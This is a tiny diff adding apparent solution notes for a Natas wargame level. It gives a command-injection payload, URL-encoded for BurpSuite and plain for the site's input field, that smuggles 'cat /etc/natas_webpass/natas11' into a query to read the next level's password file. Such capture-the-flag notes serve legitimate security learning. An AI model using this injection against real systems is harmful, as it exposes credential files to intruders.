@@ -1,0 +1,6 @@
+
+# BurpSuite
+""%20cat%20/etc/natas_webpass/natas11
+
+# Site (Input)
+"" cat /etc/natas_webpass/natas11
